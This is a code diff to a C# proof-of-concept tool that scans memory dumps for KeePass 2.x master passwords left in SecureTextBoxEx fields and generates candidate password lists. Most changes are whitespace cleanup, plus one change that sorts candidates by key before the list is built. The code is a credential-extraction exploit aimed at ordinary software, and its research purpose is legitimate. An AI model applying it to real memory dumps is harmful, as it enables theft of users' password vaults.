@@ -1,10 +1,10 @@
-﻿// Simple POC script that searches a memory dump 
-// for passwords written inside KeePass 2.x SecureTextBoxEx 
+﻿// Simple POC script that searches a memory dump
+// for passwords written inside KeePass 2.x SecureTextBoxEx
 // text box, such as the master password.
 
 // usage:
 // dotnet run PATH_TO_DUMP [PATH_TO_PWDLIST]
-// 
+//
 //
 // where PATH_TO_PWDLIST is an optional argument for generating a list of all possible passwords beginning from the second character.
 
@@ -64,7 +64,7 @@ internal static class Program
                     else
                     {
                         if (currentStrLen == 0) continue;
-                        
+
                         currentStrLen++;
 
                         string strChar;
@@ -82,7 +82,7 @@ internal static class Program
 
                         if (isValid)
                         {
-                            // Convert to UTF 8                            
+                            // Convert to UTF 8
                             if (!candidates.ContainsKey(currentStrLen))
                             {
                                 candidates.Add(currentStrLen, new HashSet<string> { strChar });
@@ -140,23 +140,26 @@ internal static class Program
             Console.WriteLine();
             count++;
         }
-      
+
         Console.WriteLine($"Combined: {combined}");
-        
+
         if (pwdListPath == string.Empty)
             return;
-        
+
         var pwdList = new List<string>();
-        generatePwdList(candidates, pwdList, passwordChar);
+        // Order by key and convert back to a dictionary
+        var orderedCandidates = candidates.OrderBy(x => x.Key).ToDictionary(x => x.Key, x => x.Value);
+        // Now call generatePwdList with the ordered dictionary
+        generatePwdList(orderedCandidates, pwdList, passwordChar);
         File.WriteAllLines(pwdListPath, pwdList);
 
         Console.WriteLine($"{pwdList.Count} possible passwords saved in {pwdListPath}. Unknown characters indicated as {passwordChar}");
     }
 
     private static void generatePwdList(
-        Dictionary<int, HashSet<string>> candidates, 
-        List<string> pwdList, 
-        string unkownChar, 
+        Dictionary<int, HashSet<string>> candidates,
+        List<string> pwdList,
+        string unkownChar,
         string pwd = "",
         int prevKey = 0)
     {
@@ -169,17 +172,17 @@ internal static class Program
             }
 
             prevKey = kvp.Key;
-            
+
             if (kvp.Value.Count == 1)
             {
                 pwd += kvp.Value.First();
                 continue;
             }
-            
+
             foreach (var val in kvp.Value)
             {
                 generatePwdList(
-                    candidates.Where(x => x.Key >= kvp.Key +1).ToDictionary(d => d.Key, d => d.Value), 
+                    candidates.Where(x => x.Key >= kvp.Key +1).ToDictionary(d => d.Key, d => d.Value),
                     pwdList,
                     unkownChar,
                     pwd + val,
